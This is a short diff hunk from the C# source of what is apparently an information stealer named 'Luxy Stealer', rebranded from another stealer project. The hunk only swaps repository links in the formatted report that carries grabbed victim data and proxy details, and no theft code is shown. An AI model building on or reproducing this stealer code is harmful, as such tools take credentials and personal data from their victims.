@@ -95,15 +95,15 @@ Proxy/VPN:     {proxy}
 ```js{grabbedInfo}
 ```
 ".Trim(),
-                    url = "https://github.com/Blank-c/Umbral-Stealer",
+                    url = "https://github.com/Ayuly3851/Luxy",
                     color = 34303,
                     footer = new FooterFormat
                     {
-                        text = $"Luxy Stealer {LuxyStub.Settings.Version} | https://github.com/Blank-c/Umbral-Stealer"
+                        text = $"Luxy Stealer {LuxyStub.Settings.Version} | https://github.com/Ayuly3851/Luxy"
                     },
                     thumbnail = new ThumbnailFormat
                     {
-                        url = "https://github.com/Blank-c/Umbral-Stealer"
+                        url = "https://github.com/Ayuly3851/Luxy"
                     }
                 }
             };
